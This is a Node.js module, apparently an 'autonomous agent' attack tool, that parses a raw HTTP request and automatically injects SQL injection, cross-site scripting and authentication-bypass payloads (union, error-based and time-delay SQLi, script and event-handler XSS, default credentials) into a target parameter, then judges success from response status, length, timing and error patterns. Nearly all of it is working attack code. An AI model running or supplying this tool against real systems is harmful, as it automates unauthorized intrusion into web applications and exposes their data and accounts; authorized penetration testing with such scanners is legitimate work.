// Using built-in fetch (Node 18+)

function parseRawRequest(raw) {
    const normalized = raw.replace(/\r\n/g, "\n");
    const lines = normalized.split("\n").map(l => l.trim()).filter(l => l.length > 0);
    
    if (lines.length === 0) throw new Error("Empty Request");

    const requestLine = lines[0].split(/\s+/);
    const method = requestLine[0] || "GET";
    let path = requestLine[1] || "/";

    const hostMatch = raw.match(/Host:\s*([^\s\n\r]+)/i);
    const host = hostMatch ? hostMatch[1].trim() : null;

    const headers = {};
    lines.slice(1).forEach(line => {
        const idx = line.indexOf(":");
        if (idx !== -1) {
            const k = line.substring(0, idx).trim().toLowerCase();
            const v = line.substring(idx + 1).trim();
            headers[k] = v;
        }
    });

    let finalUrl = path;
    if (!path.startsWith("http")) {
        if (!host) throw new Error("Host header missing");
        finalUrl = `http://${host}${path}`;
    }

    const bodyIndex = normalized.indexOf("\n\n");
    const bodyStr = bodyIndex !== -1 ? normalized.substring(bodyIndex + 2) : "";

    return { method, url: finalUrl, headers, bodyStr };
}

const sanitizeHeaders = (h) => {
    const clean = { ...h };
    delete clean["host"];
    delete clean["content-length"];
    delete clean["connection"];
    delete clean["accept-encoding"];
    return clean;
};

async function sendSingle(finalRaw) {
    const parsed = parseRawRequest(finalRaw);
    const startTime = Date.now();
    const response = await fetch(parsed.url, {
        method: parsed.method,
        headers: sanitizeHeaders(parsed.headers),
        body: (parsed.method !== "GET" && parsed.method !== "HEAD") ? parsed.bodyStr : undefined,
        redirect: "manual"
    });
    const text = await response.text();
    const endTime = Date.now();
    
    return {
        status: response.status,
        length: text.length,
        time: endTime - startTime,
        response: text
    };
}

const injectPayload = (req, param, payload) => {
  return req.replace(
    new RegExp(`${param}=[^&\\s]*`, 'i'),
    `${param}=${encodeURIComponent(payload)}`
  );
};

// 🔥 1. PAYLOAD ENGINE (BRAIN)
function generatePayloads(type, technique) {
  const library = {
    SQLi: {
      boolean: ["' OR 1=1--", "' AND 1=1--", "' OR '1'='1"],
      union: ["' UNION SELECT NULL--", "' UNION SELECT 1,2,3--", "' UNION SELECT @@version--"],
      error: ["' AND 1=(SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e)x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--"],
      time: ["' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", "'; WAITFOR DELAY '0:0:5'--"]
    },
    XSS: {
      reflected: ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"],
      stored: ["<svg onload=alert(1)>", "<iframe src='javascript:alert(1)'>"]
    },
    AuthBypass: {
      "default-creds": ["admin", "password", "root", "123456"],
      "logic-bypass": ["' OR 1=1--", "admin'--", "admin' #"]
    }
  };
  return library[type]?.[technique] || [];
}

const anomalyPatterns = [
  { name: "SQL Error", regex: /sql|syntax error|mysql|postgresql|sqlite|oracle|driver|database error/i },
  { name: "XSS Trigger", regex: /<script>|alert\(|onerror=|onload=/i },
  { name: "File Disclosure", regex: /root:x:0:0|\[boot loader\]/i },
  { name: "Server Error", regex: /internal server error|500 error|exception|stack trace/i }
];

// 🔥 2. RESULT EVALUATION ENGINE
function evaluate(result, baseline) {
  const statusChanged = result.status !== baseline.status;
  const lengthDiff = Math.abs(result.length - baseline.length);
  const lengthChanged = lengthDiff > 50;
  const redirected = result.status === 302 && baseline.status !== 302;
  const timeDiff = result.time - baseline.time;
  const timeAnomalous = timeDiff > 4000;

  let reasons = [];
  if (statusChanged) reasons.push(`Status changed (${baseline.status} → ${result.status})`);
  if (lengthChanged) reasons.push(`Length diff: ${lengthDiff} bytes`);
  if (redirected) reasons.push("Redirect detected");
  if (timeAnomalous) reasons.push(`Time delay: ${timeDiff}ms`);

  for (const pattern of anomalyPatterns) {
    if (pattern.regex.test(result.response) && !pattern.regex.test(baseline.response)) {
      reasons.push(`Pattern match: ${pattern.name}`);
    }
  }

  return {
    success: reasons.length > 0,
    reasons,
    metrics: { statusChanged, lengthChanged, redirected, timeAnomalous }
  };
}

// 🔥 3. AUTONOMOUS AGENT LOOP
async function runAutoAttack({ rawRequest, parameter, onStep }) {
    console.log(`[AGENT] Starting Autonomous Loop on param: ${parameter}`);
    
    // Memory
    const agentMemory = { tried: [], failed: [], successful: [] };
    
    // 4. Baseline
    const baseline = await sendSingle(rawRequest);
    
    // 5. DECISION ENGINE (Dynamic Plan)
    const isLogin = rawRequest.toLowerCase().includes("login") || rawRequest.toLowerCase().includes("auth");
    const hasReflection = baseline.response.includes(parameter);

    let attackPlan = [
      { type: "SQLi", techniques: ["boolean", "error", "union", "time"], confidence: 0.1 },
      { type: "XSS", techniques: ["reflected", "stored"], confidence: 0.1 },
      { type: "AuthBypass", techniques: ["logic-bypass", "default-creds"], confidence: 0.1 }
    ];

    // Priority Shift
    if (isLogin) {
      attackPlan.find(a => a.type === "SQLi").confidence = 0.5;
      attackPlan.find(a => a.type === "AuthBypass").confidence = 0.8;
      attackPlan.sort((a, b) => b.confidence - a.confidence);
    }
    if (hasReflection) {
      attackPlan.find(a => a.type === "XSS").confidence = 0.6;
      attackPlan.sort((a, b) => b.confidence - a.confidence);
    }

    const findings = [];

    // 🔥 OUTER LOOP: ATTACK TYPES
    for (const attack of attackPlan) {
      onStep({ type: "switch-strategy", attack: attack.type, confidence: attack.confidence });

      // 🔥 INNER LOOP: TECHNIQUES
      for (const technique of attack.techniques) {
        onStep({ type: "try-technique", attack: attack.type, technique });
        
        const payloads = generatePayloads(attack.type, technique);
        let techniqueSuccess = false;

        for (const payload of payloads) {
          const mutatedRaw = injectPayload(rawRequest, parameter, payload);
          const result = await sendSingle(mutatedRaw);
          const evalRes = evaluate(result, baseline);

          if (evalRes.success) {
            techniqueSuccess = true;
            const finding = {
                type: attack.type,
                technique,
                payload,
                reasons: evalRes.reasons,
                metrics: evalRes.metrics,
                baseline: { status: baseline.status, length: baseline.length, time: baseline.time },
                result: { status: result.status, length: result.length, time: result.time }
            };
            findings.push(finding);
            agentMemory.successful.push({ attack: attack.type, technique });
            onStep({ type: "success", finding });
            
            // If it's a high-confidence hit, we might stop or continue.
            // For now, let's stop this technique and move to next attack or finish.
            break; 
          }
        }

        if (!techniqueSuccess) {
          agentMemory.failed.push({ attack: attack.type, technique });
          onStep({ type: "fail", attack: attack.type, technique });
        } else {
          // If we found a vulnerability in this attack type, maybe we are done?
          // The user said "return result; // ✅ STOP" in their loop.
          // Let's return the final report once we find a hit.
          return {
            success: true,
            findings,
            memory: agentMemory,
            vulnerable: true,
            plan: attackPlan
          };
        }
      }
    }

    return {
        success: true,
        findings,
        memory: agentMemory,
        vulnerable: findings.length > 0,
        plan: attackPlan
    };
}

module.exports = { runAutoAttack };
